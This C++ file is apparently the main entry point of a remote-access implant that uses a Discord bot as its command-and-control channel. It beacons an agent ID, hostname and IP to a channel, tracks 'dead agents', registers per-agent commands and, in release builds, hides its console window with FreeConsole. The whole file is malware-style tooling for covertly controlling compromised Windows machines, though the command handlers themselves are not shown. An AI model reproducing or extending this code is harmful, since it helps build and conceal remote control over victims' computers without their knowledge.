#include "core/DiscordClient.h"
#include "agents/dead_agent_manager.h"

void DiscordClientThread(DiscordClient& bot, const config::BotConfig& cfg) {
    bot.Start();
}

void RunBot() {
    auto cfg = config::initialize_config();
    std::this_thread::sleep_for(std::chrono::seconds(2));
    DiscordClient bot(cfg);

    std::thread time_thread(UpdateTime, config::cfg.token, config::cfg.beacon_chanel_id, config::cfg.agent_id, config::cfg.hostname, config::cfg.ip);
    time_thread.detach();

    std::this_thread::sleep_for(std::chrono::seconds(2));

    std::thread register_all_thread([&bot, &cfg]() {
        std::thread dead_thread(CheckDeadAgents, cfg.token, cfg.beacon_chanel_id);
        dead_thread.detach();
        std::this_thread::sleep_for(std::chrono::seconds(5));
        auto uniqueAgentIds = get_unique_agent_ids(cfg);
        std::this_thread::sleep_for(std::chrono::seconds(5));
        bot.RegisterCommands(uniqueAgentIds);
        });
    register_all_thread.detach();

    std::this_thread::sleep_for(std::chrono::seconds(10));
    std::thread discordThread(DiscordClientThread, std::ref(bot), std::ref(cfg));
    discordThread.detach();

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

#ifdef DEBUG_MODE
int main() {
    std::cout << "Starting Discord bot (Debug Mode)..." << std::endl;
    RunBot();
    return 0;
}
#else
int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    FreeConsole();
    RunBot();
    return 0;
}
#endif